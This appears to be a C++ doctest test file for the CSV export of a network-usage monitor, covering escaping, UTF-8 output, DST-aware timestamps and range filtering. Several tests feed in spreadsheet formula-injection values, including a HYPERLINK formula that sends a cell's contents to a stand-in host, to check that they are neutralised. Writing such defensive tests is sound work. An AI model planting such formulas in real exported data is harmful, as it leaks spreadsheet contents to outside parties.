#include "doctest.h"

#include <windows.h>

#include <ctime>
#include <filesystem>
#include <fstream>
#include <iterator>
#include <random>

#include "report/csv_export.h"

using namespace nsm;
namespace fs = std::filesystem;

namespace {
int64_t UtcOf(int y, int mo, int d, int h, int mi = 0) {
    std::tm tm{};
    tm.tm_year = y - 1900; tm.tm_mon = mo - 1; tm.tm_mday = d; tm.tm_hour = h; tm.tm_min = mi;
    return _mkgmtime(&tm);
}
struct TempDir {
    fs::path dir;
    TempDir() {
        std::random_device rd;
        dir = fs::temp_directory_path() / (L"nsm_csv_" + std::to_wstring(rd()) + L"_" + std::to_wstring(rd()));
        fs::create_directories(dir);
    }
    ~TempDir() { std::error_code ec; fs::remove_all(dir, ec); }
};
std::string ReadAll(const fs::path& p) {
    std::ifstream f(p, std::ios::binary);
    return std::string(std::istreambuf_iterator<char>(f), {});
}
const std::string kHeader =
    "start_local,granularity,series,adapter_id,adapter_name,adapter_kind,network,received_bytes,sent_bytes\r\n";
}  // namespace

TEST_CASE("CsvEscape quotes commas and quotes") {
    CHECK(CsvEscape(R"(Wi-Fi "Home", 5G)") == R"("Wi-Fi ""Home"", 5G")");
    CHECK(CsvEscape("plain") == "plain");
    CHECK(CsvEscape("") == "");
}

TEST_CASE("CsvEscape quotes CR and LF") {
    CHECK(CsvEscape("a\nb") == "\"a\nb\"");
    CHECK(CsvEscape("a\rb") == "\"a\rb\"");
    CHECK(CsvEscape("a\r\nb") == "\"a\r\nb\"");
}

TEST_CASE("CsvTextField neutralises text a spreadsheet would run as a formula") {
    CHECK(CsvTextField(R"(=HYPERLINK("//x.y/"&B2))") == R"x("'=HYPERLINK(""//x.y/""&B2)")x");
    CHECK(CsvTextField("-Home") == "'-Home");
    CHECK(CsvTextField("+1 555") == "'+1 555");
    CHECK(CsvTextField("@SUM(A1)") == "'@SUM(A1)");
    CHECK(CsvTextField("\tTab") == "'\tTab");
    CHECK(CsvTextField("\rCR") == "\"'\rCR\"");   // the CR still needs RFC 4180 quoting
    CHECK(CsvTextField("Home") == "Home");
    CHECK(CsvTextField("Home-5G = fast") == "Home-5G = fast");   // only the first character matters
    CHECK(CsvTextField("Home, 5G") == "\"Home, 5G\"");
    CHECK(CsvTextField("") == "");
}

TEST_CASE("ExportCsv neutralises formulas in names but not in the numbers" * doctest::test_suite("integration")) {
    TempDir d; UsageStore st; REQUIRE(st.Open(d.dir / L"usage.db") == UsageStore::OpenResult::Ok);
    auto tz = *TimeZone::FromKey(L"Pacific Standard Time");
    st.UpsertAdapter(L"{A}", L"-Adapter", AdapterKind::WiFi);
    st.UpsertNetwork({L"{N}", LR"(=HYPERLINK("//x.y/"&B2))"});
    UsageRow r{UtcOf(2026, 10, 18, 15), Series::Adapter, L"{A}", L"{N}", 1234, 56};
    st.AddUsage(std::span<const UsageRow>(&r, 1));

    const auto file = d.dir / L"out.csv";
    REQUIRE(ExportCsv(file, st, {UtcOf(2026, 10, 18, 7), UtcOf(2026, 10, 19, 7)}, tz));
    const std::string s = ReadAll(file);
    CHECK(s.find("2026-10-18 08:00,hour,adapter,{A},'-Adapter,wifi,\"'=HYPERLINK(\"\"//x.y/\"\"&B2)\",1234,56\r\n") !=
          std::string::npos);
}

TEST_CASE("ExportCsv writes UTF-8 with BOM" * doctest::test_suite("integration")) {
    TempDir d; UsageStore st; REQUIRE(st.Open(d.dir / L"usage.db") == UsageStore::OpenResult::Ok);
    auto tz = *TimeZone::FromKey(L"Pacific Standard Time");
    st.UpsertAdapter(L"{A}", L"Café", AdapterKind::WiFi);
    st.UpsertNetwork({L"{N}", L"Home, \"5G\""});
    UsageRow r{UtcOf(2026, 10, 18, 15), Series::Adapter, L"{A}", L"{N}", 1234, 56};
    st.AddUsage(std::span<const UsageRow>(&r, 1));
    UsageRow r2{UtcOf(2026, 10, 18, 15), Series::Internet, L"{A}", L"", 7, 8};
    st.AddUsage(std::span<const UsageRow>(&r2, 1));

    const auto file = d.dir / L"out.csv";
    REQUIRE(ExportCsv(file, st, {UtcOf(2026, 10, 18, 7), UtcOf(2026, 10, 19, 7)}, tz));
    const std::string s = ReadAll(file);
    REQUIRE(s.size() > 3);
    CHECK((unsigned char)s[0] == 0xEF); CHECK((unsigned char)s[1] == 0xBB); CHECK((unsigned char)s[2] == 0xBF);
    CHECK(s.substr(3, kHeader.size()) == kHeader);
    CHECK(s.find("Caf\xC3\xA9") != std::string::npos);   // UTF-8 for e-acute
    CHECK(s.find("2026-10-18 08:00,hour,adapter,{A},Caf\xC3\xA9,wifi,\"Home, \"\"5G\"\"\",1234,56\r\n") != std::string::npos);
    CHECK(s.find("2026-10-18 08:00,hour,internet,{A},Caf\xC3\xA9,wifi,,7,8\r\n") != std::string::npos);
    CHECK_FALSE(fs::exists(fs::path(file).concat(L".tmp")));
}

TEST_CASE("ExportCsv writes the local start of a short bucket with its minutes" * doctest::test_suite("integration")) {
    TempDir d; UsageStore st; REQUIRE(st.Open(d.dir / L"usage.db") == UsageStore::OpenResult::Ok);
    auto tz = *TimeZone::FromKey(L"Lord Howe Standard Time");
    // 15:30Z on 2026-10-03 is the 02:00 -> 02:30 DST change: the bucket starts at 02:30 local.
    UsageRow r{UtcOf(2026, 10, 3, 15, 30), Series::Internet, L"e", L"", 3, 4};
    st.AddUsage(std::span<const UsageRow>(&r, 1));
    const auto file = d.dir / L"lh.csv";
    REQUIRE(ExportCsv(file, st, {UtcOf(2026, 10, 3, 13, 30), UtcOf(2026, 10, 4, 13)}, tz));
    CHECK(ReadAll(file).find("2026-10-04 02:30,hour,internet,e,e,other,,3,4\r\n") != std::string::npos);
}

TEST_CASE("ExportCsv includes daily rows and respects the range" * doctest::test_suite("integration")) {
    TempDir d; UsageStore st; REQUIRE(st.Open(d.dir / L"usage.db") == UsageStore::OpenResult::Ok);
    auto tz = *TimeZone::FromKey(L"Pacific Standard Time");
    const auto now = UtcOf(2026, 10, 18, 19);
    st.UpsertAdapter(L"e", L"Eth", AdapterKind::Ethernet);
    UsageRow old{UtcOf(2026, 3, 10, 18), Series::Adapter, L"e", L"", 11, 22};
    st.AddUsage(std::span<const UsageRow>(&old, 1));
    st.RollUp(now, tz);
    UsageRow outside{UtcOf(2026, 10, 1, 18), Series::Adapter, L"e", L"", 99, 99};
    st.AddUsage(std::span<const UsageRow>(&outside, 1));

    const auto file = d.dir / L"o.csv";
    REQUIRE(ExportCsv(file, st, {UtcOf(2026, 1, 1, 8), UtcOf(2026, 6, 1, 7)}, tz));
    const std::string s = ReadAll(file);
    CHECK(s.find("2026-03-10,day,adapter,e,Eth,ethernet,,11,22\r\n") != std::string::npos);
    CHECK(s.find(",99,99") == std::string::npos);
}

TEST_CASE("ExportCsv fails cleanly when the file cannot be written" * doctest::test_suite("integration")) {
    TempDir d; UsageStore st; REQUIRE(st.Open(d.dir / L"usage.db") == UsageStore::OpenResult::Ok);
    auto tz = *TimeZone::FromKey(L"Pacific Standard Time");
    const auto file = d.dir / L"missing_dir" / L"out.csv";
    CHECK_FALSE(ExportCsv(file, st, {0, 1000000}, tz));
    CHECK_FALSE(fs::exists(file));
}
